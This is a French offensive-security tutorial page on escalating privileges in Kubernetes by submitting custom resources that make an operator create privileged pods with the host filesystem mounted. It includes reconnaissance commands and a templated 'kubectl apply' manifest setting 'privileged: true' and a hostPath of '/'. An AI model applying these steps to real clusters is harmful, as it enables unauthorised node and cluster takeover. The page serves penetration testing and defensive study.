---
title: "Abus d'opérateurs et de CRD : piloter un contrôleur privilégié via ses ressources"
description: "Un opérateur surveille des ressources personnalisées et les réconcilie en charges de travail, s'exécutant avec un compte de service suffisamment large pour gérer tout ce qu'il provisionne. Un attaquant capable de créer ou modifier les ressources personnalisées de l'opérateur l'oriente vers la création de pods privilégiés, le montage de chemins de l'hôte ou l'octroi d'accès, de sorte que l'opérateur réalise l'action avec ses propres droits élevés pour le compte de l'attaquant."
keywords:
  - operator
  - custom resource
  - crd
  - reconcile
  - confused deputy
---

# Abus d'opérateurs et de CRD

Un opérateur est un contrôleur qui surveille une définition de ressource personnalisée et réconcilie ses instances en objets de cluster réels : un opérateur de base de données transforme une ressource `PostgresCluster` en StatefulSets, services et secrets. Pour cela, le compte de service de l'opérateur doit pouvoir créer ces objets, il est donc largement privilégié. Cela fait de l'opérateur un adjoint confus (confused deputy). Un attaquant capable de créer ou modifier les ressources personnalisées qu'il surveille, ce qui ne nécessite souvent que des droits sur ce CRD et non sur les objets sous-jacents, oriente l'opérateur vers la création de ce que l'attaquant spécifie, réalisée avec les permissions élevées de l'opérateur.

Repérez les opérateurs et les ressources sur lesquelles ils agissent :

```bash
kubectl get crd                                        # custom resource types
kubectl get pods -A | grep -iE 'operator|controller'
# what can the operator's service account do? (the privilege you borrow)
kubectl get clusterrolebindings -o json | python3 -c '
import sys,json
for b in json.load(sys.stdin)["items"]:
    for s in b.get("subjects") or []:
        if s.get("kind")=="ServiceAccount" and "operator" in s.get("name",""):
            print(b["roleRef"]["name"], s["namespace"]+"/"+s["name"])'
# can you create/edit the custom resources it reconciles?
kubectl auth can-i create <crd-plural>.<crd-group>
```

## Orienter l'opérateur

```bash
# submit a custom resource whose spec the operator renders into a privileged
# workload or an over-broad grant. The exact fields are operator-specific;
# look for spec options that map to pod security, volumes, or extra RBAC:
kubectl apply -f - <<'YAML'
apiVersion: <crd-group>/v1
kind: <CustomKind>
metadata: { name: x, namespace: <ns> }
spec:
  # fields the operator passes through to a pod spec it creates, e.g.
  podTemplate:
    securityContext: { privileged: true }
    volumes: [{ name: h, hostPath: { path: / } }]
YAML
# the operator reconciles this into a privileged, host-mounting pod it creates
```

## Notes d'exploitation

- Le privilège que vous obtenez est celui de l'opérateur, pas le vôtre : créer une ressource personnalisée peut ne nécessiter que des droits sur ce CRD, pourtant l'opérateur crée ensuite des pods privilégiés ou des secrets que vous ne pourriez pas créer directement, ce qui constitue l'escalade.
- Recherchez les champs de spec de l'opérateur qui se répercutent sur les contextes de sécurité des pods, les volumes, les images, ou qui génèrent du RBAC ; ce sont les leviers qui transforment une ressource personnalisée d'apparence anodine en compromission de nœud ou de cluster.
- Certains opérateurs exécutent leurs charges de travail réconciliées avec leur propre compte de service puissant monté, donc un pod que vous l'amenez à créer peut lui-même porter un jeton fort ; vérifiez ce que le compte de service du pod créé peut faire.
- C'est la forme Kubernetes d'une escalade par adjoint confus ; elle s'enchaîne avec [Évasion de pod vers le nœud](../pod-escape-to-node/index.md) lorsque le pod orienté est privilégié.

## Références

- [Kubernetes : ressources personnalisées et opérateurs](https://kubernetes.io/docs/concepts/extend-kubernetes/operator/)
- [Operator Framework](https://operatorframework.io/)
- [HackTricks: Kubernetes operators](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
